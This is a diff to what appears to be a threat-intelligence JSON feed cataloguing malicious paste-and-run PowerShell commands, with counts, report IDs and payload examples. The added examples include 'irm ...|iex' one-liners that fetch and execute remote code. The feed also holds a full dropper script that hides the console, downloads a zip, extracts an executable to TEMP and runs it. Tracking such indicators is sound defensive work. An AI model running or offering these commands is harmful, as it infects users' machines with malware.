@@ -1,10 +1,10 @@
 [
   {
     "Pattern": "irm '<URL>'|iex;",
-    "DistinctPayloadCount": 121,
-    "ReportCount": 121,
+    "DistinctPayloadCount": 122,
+    "ReportCount": 122,
     "FirstSeen": "2026-11-10T09:55:19.073000+00:00",
-    "LastSeen": "2026-11-14T16:37:51.895000+00:00",
+    "LastSeen": "2026-11-14T23:14:54.846000+00:00",
     "ReportIds": [
       "cmwaikzu608q10omllivblirh",
       "cmwaila5l08ql0omlduekey7c",
@@ -126,7 +126,8 @@
       "cmwfarrwk0fv70oml64i0nnlm",
       "cmwfq2sdt0iq70omlfqlpffxx",
       "cmwginvma0lic0omlk1c2ku1a",
-      "cmwgmq2yd0lr20omlqz1zffk5"
+      "cmwgmq2yd0lr20omlqz1zffk5",
+      "cmwh0wou40mte0omlvnsta2vn"
     ],
     "PayloadExamples": [
       "irm 'browse-cloud.codes/013ce88bf8a96d89'|iex;",
@@ -140,6 +141,7 @@
       "irm 'browse-cloud.codes/45ed2a2e3f4dfb39'|iex;",
       "irm 'browse-cloud.codes/4b7ddb4fc39a9ff3'|iex;",
       "irm 'browse-cloud.codes/517644a705a49caa'|iex;",
+      "irm 'browse-cloud.codes/57d18a33b935e5b2'|iex;",
       "irm 'browse-cloud.codes/5d69fe5eb757ed96'|iex;",
       "irm 'browse-cloud.codes/5f16a861fec93d5c'|iex;",
       "irm 'browse-cloud.codes/62f2ca8cc1e23e58'|iex;",
@@ -439,10 +441,10 @@
   },
   {
     "Pattern": "IRM <URL> | IEX",
-    "DistinctPayloadCount": 14,
-    "ReportCount": 192,
+    "DistinctPayloadCount": 15,
+    "ReportCount": 193,
     "FirstSeen": "2026-11-09T05:35:49.068000+00:00",
-    "LastSeen": "2026-11-14T14:43:02.568000+00:00",
+    "LastSeen": "2026-11-14T23:30:26.206000+00:00",
     "ReportIds": [
       "cmw8tvf9t236w0omlli0mmgpj",
       "cmw8tys4823d20omlhuzrneog",
@@ -635,9 +637,11 @@
       "cmwfatb1y0fzr0oml1jpy5rwb",
       "cmwfo93tk0gqe0oml1kpi8kea",
       "cmwgilzy30lfb0oml5aansa6p",
-      "cmwgimf3v0lg20omleagzrf9n"
+      "cmwgimf3v0lg20omleagzrf9n",
+      "cmwh1gnh80n1i0oml3wpgy548"
     ],
     "PayloadExamples": [
+      "IRM gitlab[.]com/amber-ffa-f15a6b/01a1db1b-d21d-70c0-971b-cc4b6f224188/-/raw/main/01a1db1b-d21d-70c0-971b-cc4b6fe25881 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/07684D2-7E68-43a4-B972-7b11871881A1 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/14102f0-b5a6-4e2d-84e1-18b2be0bca16/-/raw/main/973C9-C666-460a-bdCf-0CB8b8A9c503 | IEX",
       "IRM gitlab[.]com/amber-ffa-f15a6b/159d3a7-2e62-4327-8809-ae26c5229aac/-/raw/main/ae9c540-98b4-4ff2-b728-07d076feb589 | IEX",
@@ -710,9 +714,9 @@
   {
     "Pattern": "$url = \"<URL>\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit",
     "DistinctPayloadCount": 1,
-    "ReportCount": 34,
+    "ReportCount": 39,
     "FirstSeen": "2026-11-09T05:27:49.953000+00:00",
-    "LastSeen": "2026-11-13T12:10:00.700000+00:00",
+    "LastSeen": "2026-11-14T23:30:04.308000+00:00",
     "ReportIds": [
       "cmw8tl5kz22nz0omlh7329rch",
       "cmw8unshl24of0oml3g305qzl",
@@ -747,7 +751,12 @@
       "cmwe7a1hu080y0omlm1sm6qb3",
       "cmwe7bryf083t0oml8z2ibumi",
       "cmwexp5yl0eli0oml5k19n8dt",
-      "cmwexpro50eni0oml5kyjd00v"
+      "cmwexpro50eni0oml5kyjd00v",
+      "cmwh0vpmy0mp50omlfe1m6kow",
+      "cmwh0vvj10mqc0oml9lg9ojng",
+      "cmwh0way90mro0oml97xjcl0x",
+      "cmwh14adz0mwn0oml6i65gll2",
+      "cmwh1g6lg0n080omlf2dfb4rr"
     ],
     "PayloadExamples": [
       "$url = \"https://frclau[.]com/eoN\";\n$filename = \"Boost Note.exe\";\n$path = $env:TEMP;\n$archive = Join-Path $path \"zN3HyHJT.zip\";\n$filepath = Join-Path $path $filename;\n$signature = @\"\nusing System;\nusing System.Runtime.InteropServices;\npublic class Win32 {\n\t[DllImport(\"kernel32.dll\")]\n\tpublic static extern IntPtr GetConsoleWindow();\n\t[DllImport(\"user32.dll\")]\n\tpublic static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);\n}\n\"@;\nAdd-Type $signature;\n$hwnd = [Win32]::GetConsoleWindow();\nif($hwnd -ne [IntPtr]::Zero)\n{\n\t[Win32]::ShowWindow($hwnd, 0);\n}\nNew-Item -Path $path -ItemType Directory -Force;\ncurl $url -o $archive;\nExpand-Archive -Path $archive -DestinationPath $path -Force;\nRemove-Item $archive -Force;\nStart-Process $filepath;\nexit"
